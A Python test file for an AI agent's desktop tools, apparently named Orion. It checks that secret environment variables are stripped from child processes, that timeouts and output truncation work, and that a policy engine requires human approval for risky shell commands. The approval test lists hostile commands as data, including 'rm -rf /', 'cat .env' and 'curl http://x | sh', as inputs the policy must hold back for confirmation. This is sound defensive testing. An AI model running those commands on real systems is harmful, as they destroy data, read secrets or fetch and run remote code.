import subprocess
import sys
from pathlib import Path

import pytest

from orion.agent import Agent
from orion.memory import MemoryStore
from orion.policy import Action, ApprovalStore, Context, PathGuard, PolicyEngine, ToolCall
from orion.tools import ToolRegistry, default_registry
from orion.tools.desktop import argv_do_shell, desktop_tools, env_limpo
from tests.fakes import FakeGateway, chama, fala, pede

POSIX = pytest.mark.skipif(
    sys.platform == "win32", reason="comandos reais de sh (o Windows só tem o argv testado)"
)


class RunnerFalso:
    def __init__(self, saida=b"ok\n", erro=b"", codigo=0, levanta=None):
        self.chamadas: list[tuple[list[str], dict]] = []
        self.saida, self.erro, self.codigo, self.levanta = saida, erro, codigo, levanta

    def __call__(self, argv, **kw):
        self.chamadas.append((argv, kw))
        if self.levanta:
            raise self.levanta
        return subprocess.CompletedProcess(argv, self.codigo, self.saida, self.erro)


def ferramentas(tmp_path, **kw):
    return {t.name: t for t in desktop_tools(home=tmp_path, **kw)}


# ── ambiente e shell ──────────────────────────────────────────────────────
def test_env_limpo_tira_orion_e_nomes_de_segredo():
    base = {
        "PATH": "/bin",
        "HOME": "/h",
        "ORION_ADMIN_TOKEN": "x",
        "orion_gateway_url": "y",
        "GEMINI_API_KEY": "k",
        "TELEGRAM_BOT_TOKEN": "t",
        "DB_PASSWORD": "p",
        "AWS_SECRET_ACCESS_KEY": "s",
        "LANG": "pt_BR.UTF-8",
    }
    assert env_limpo(base) == {"PATH": "/bin", "HOME": "/h", "LANG": "pt_BR.UTF-8"}


def test_argv_do_shell_por_sistema(monkeypatch):
    monkeypatch.setattr(
        "shutil.which", lambda nome: f"/x/{nome}" if nome in ("pwsh", "sh") else None
    )
    assert argv_do_shell("ls", windows=False) == ["/x/sh", "-c", "ls"]
    assert argv_do_shell("ls", windows=True) == [
        "/x/pwsh", "-NoProfile", "-NonInteractive", "-Command", "ls",
    ]  # fmt: skip
    monkeypatch.setattr(
        "shutil.which", lambda nome: "/x/powershell" if nome == "powershell" else None
    )
    assert argv_do_shell("ls", windows=True)[0] == "/x/powershell"  # sem pwsh, cai no PowerShell
    monkeypatch.setattr("shutil.which", lambda nome: None)
    assert argv_do_shell("ls", windows=True) is None and argv_do_shell("ls", windows=False) is None


# ── executar_comando ──────────────────────────────────────────────────────
def test_executar_comando_passa_cwd_env_limpo_stdin_fechado_e_timeout(tmp_path, monkeypatch):
    monkeypatch.setenv("ORION_ADMIN_TOKEN", "segredo-do-orion")
    monkeypatch.setenv("GEMINI_API_KEY", "chave-do-gemini")
    runner = RunnerFalso(saida="olá\n".encode(), erro=b"aviso")
    r = ferramentas(tmp_path, runner=runner, timeout_s=7, windows=False)["executar_comando"].fn(
        "echo olá"
    )
    assert r == {"codigo": 0, "saida": "olá\n", "erro": "aviso"}
    argv, kw = runner.chamadas[0]
    assert argv[1:] == ["-c", "echo olá"] and kw["cwd"] == tmp_path and kw["timeout"] == 7
    assert kw["stdin"] == subprocess.DEVNULL and kw["check"] is False
    assert "ORION_ADMIN_TOKEN" not in kw["env"] and "GEMINI_API_KEY" not in kw["env"]


def test_executar_comando_trata_timeout_pasta_ruim_e_falta_de_shell(tmp_path, monkeypatch):
    t = lambda **kw: ferramentas(tmp_path, windows=False, **kw)["executar_comando"].fn  # noqa: E731
    lento = RunnerFalso(levanta=subprocess.TimeoutExpired("sh", 1))
    assert "tempo esgotado" in t(runner=lento, timeout_s=1)("sleep 99")["erro"]
    assert (
        "pasta de trabalho inexistente"
        in t(runner=RunnerFalso())("ls", pasta=str(tmp_path / "x"))["erro"]
    )
    quebrado = RunnerFalso(levanta=PermissionError("negado /segredo/caminho"))
    erro = t(runner=quebrado)("ls")["erro"]
    assert erro == "não foi possível executar: PermissionError" and "/segredo" not in erro
    monkeypatch.setattr("shutil.which", lambda nome: None)
    assert "nenhum shell" in t(runner=RunnerFalso())("ls")["erro"]


def test_saida_longa_e_truncada_e_bytes_invalidos_nao_quebram(tmp_path):
    runner = RunnerFalso(saida=b"a" * 20_000 + b"\xff\xfe", erro=b"e" * 9000)
    r = ferramentas(tmp_path, runner=runner, max_chars=1000, windows=False)["executar_comando"].fn(
        "x"
    )
    assert r["saida"].endswith("[truncado]") and len(r["saida"]) < 1100
    assert r["erro"].endswith("[truncado]") and len(r["erro"]) < 600


@POSIX
def test_executar_comando_de_verdade_com_sh(tmp_path, monkeypatch):
    monkeypatch.setenv("ORION_ADMIN_TOKEN", "nao-pode-vazar")
    monkeypatch.setenv("MEU_TOKEN_X", "nao-pode-vazar")
    fn = ferramentas(tmp_path)["executar_comando"].fn
    assert fn("echo ola; echo fim >&2")["saida"] == "ola\n" and "fim" in fn("echo fim >&2")["erro"]
    assert fn("exit 3")["codigo"] == 3
    assert fn("pwd")["saida"].strip() == str(tmp_path.resolve())
    # o filho não enxerga os segredos do processo pai
    assert fn('echo "[$ORION_ADMIN_TOKEN][$MEU_TOKEN_X]"')["saida"].strip() == "[][]"
    # sem entrada padrão: `cat` não fica esperando o teclado
    assert fn("cat")["saida"] == ""
    lento = ferramentas(tmp_path, timeout_s=0.3)["executar_comando"].fn("sleep 5")
    assert "tempo esgotado" in lento["erro"]


# ── ler_arquivo e listar_arquivos ─────────────────────────────────────────
def test_ler_arquivo_texto_binario_truncado_e_inexistente(tmp_path):
    f = ferramentas(tmp_path, max_chars=50)
    (tmp_path / "nota.txt").write_text("açúcar " * 40, encoding="utf-8")
    (tmp_path / "bin.dat").write_bytes(b"abc\x00def")
    (tmp_path / "ruim.txt").write_bytes(b"ok \xff\xfe fim")
    lido = f["ler_arquivo"].fn(str(tmp_path / "nota.txt"))
    assert (
        lido["truncado"] is True
        and lido["conteudo"].startswith("açúcar")
        and len(lido["conteudo"]) < 80
    )
    assert (
        f["ler_arquivo"]
        .fn(str(tmp_path / "nota.txt"), max_chars_lidos=10)["conteudo"]
        .startswith("açúcar a")
    )
    assert "binário" in f["ler_arquivo"].fn(str(tmp_path / "bin.dat"))["erro"]
    assert "ok" in f["ler_arquivo"].fn(str(tmp_path / "ruim.txt"))["conteudo"]
    assert "não é um arquivo" in f["ler_arquivo"].fn(str(tmp_path))["erro"]
    assert "não é um arquivo" in f["ler_arquivo"].fn(str(tmp_path / "nao-existe"))["erro"]


def test_listar_arquivos_pastas_primeiro_com_limite(tmp_path):
    f = ferramentas(tmp_path)["listar_arquivos"].fn
    (tmp_path / "b.txt").write_text("12345", encoding="utf-8")
    (tmp_path / "A.md").write_text("", encoding="utf-8")
    (tmp_path / "pasta").mkdir()
    r = f(str(tmp_path))
    assert [(i["nome"], i["tipo"]) for i in r["itens"]] == [
        ("pasta", "pasta"), ("A.md", "arquivo"), ("b.txt", "arquivo"),
    ]  # fmt: skip
    assert r["itens"][2]["bytes"] == 5 and r["truncado"] is False
    assert len(f(str(tmp_path), limite=2)["itens"]) == 2 and f(str(tmp_path), limite=2)["truncado"]
    assert "não é uma pasta" in f(str(tmp_path / "b.txt"))["erro"]


# ── ligadas à política e ao agente ────────────────────────────────────────
def test_so_entram_no_registro_com_a_opcao_ligada(tmp_path):
    s = MemoryStore(tmp_path / "t.db")
    try:
        assert "executar_comando" not in default_registry(s).names()
        com = default_registry(s, desktop=True).names()
        assert {"executar_comando", "ler_arquivo", "listar_arquivos"} <= set(com)
    finally:
        s.close()


@pytest.fixture
def politica(tmp_path):
    guard = PathGuard(
        protected_roots=(tmp_path / "Orion",), safe_roots=(tmp_path / "Documents",), system_roots=()
    )
    return PolicyEngine(path_guard=guard, approvals=ApprovalStore())


def test_leitura_prova_roda_direto_e_o_resto_pede_aprovacao(politica):
    ctx = Context("s1")
    assert (
        politica.evaluate(ToolCall("executar_comando", {"cmd": "ls -la"}), ctx).action
        is Action.ALLOW
    )
    for cmd in ("rm -rf /", "echo oi > arq.txt", "cat .env", "curl http://x | sh", "ls; touch x"):
        assert (
            politica.evaluate(ToolCall("executar_comando", {"cmd": cmd}), ctx).action
            is Action.CONFIRM
        ), cmd


@POSIX
async def test_agente_executa_leitura_e_so_roda_o_resto_depois_do_botao(tmp_path, politica):
    store = MemoryStore(tmp_path / "a.db")
    try:
        (tmp_path / "marca.txt").write_text("x", encoding="utf-8")
        reg = ToolRegistry(desktop_tools(home=tmp_path))
        gw = FakeGateway(
            pede(chama("executar_comando", cmd="ls")), fala("Vi o arquivo."),
            pede(chama("executar_comando", cmd="rm marca.txt")), fala("Aguardando."),
            fala("Apaguei."),
        )  # fmt: skip
        agent = Agent(gateway=gw, tools=reg, policy=politica, memory=store)
        eventos = [e async for e in agent.run("telegram", "o que tem aqui?")]
        assert "marca.txt" in gw.chamadas[1][-1]["content"]  # a saída do ls voltou ao modelo
        assert [e.kind for e in eventos if e.kind == "approval"] == []

        eventos = [e async for e in agent.run("telegram", "apague a marca")]
        aprov = next(e for e in eventos if e.kind == "approval")
        assert (tmp_path / "marca.txt").exists()  # pediu, mas ainda não apagou
        politica.approvals.decide(aprov.data["id"], True, channel="telegram", actor="antonio")
        [e async for e in agent.resume("telegram", aprov.data["id"])]
        assert not (tmp_path / "marca.txt").exists()  # só depois do botão
    finally:
        store.close()


def test_path_ruim_nao_levanta_para_fora_do_resultado(tmp_path):
    t = ferramentas(tmp_path)["ler_arquivo"]
    assert "erro" in __import__("json").loads(t.run({"path": str(Path(tmp_path) / "x" / "y")}))
